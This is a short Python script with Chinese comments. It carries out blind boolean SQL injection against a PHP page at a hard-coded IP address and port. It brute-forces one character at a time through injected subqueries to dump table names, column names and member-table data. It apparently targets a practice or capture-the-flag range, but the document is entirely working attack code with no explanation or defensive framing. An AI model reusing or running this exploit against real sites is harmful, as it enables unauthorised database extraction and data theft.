import requests
import re

base_url = 'http://219.153.49.228:40671/new_list.php?id=1^()'

tmp = ''

headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36'
        }

#构造url,爆数据表
# url = 'http://219.153.49.228:40671/new_list.php?id=1^((SELECT ASCII(MID((SELECT GROUP_CONCAT(table_name) from information_schema.tables where table_schema=DATABASE())from({})))) ={})'

#构造url，爆列
# url = "http://219.153.49.228:40671/new_list.php?id=1^((SELECT ASCII(MID((SELECT GROUP_CONCAT(column_name) from information_schema.columns where table_name='notice')from({})))) ={})"

#构造url，爆数据
url = "http://219.153.49.228:40671/new_list.php?id=1^((SELECT ASCII(MID((SELECT GROUP_CONCAT(status) from StormGroup_member)from({})))) ={})"

for i in range(1,200):
    for j in range(1,128):
        url1 = url.format(i,j)
        response = requests.get(url1, headers=headers)
        data = response.content.decode()
        if '关于平台停机维护的通知' not in data:
            tmp += chr(j)
            print(tmp)

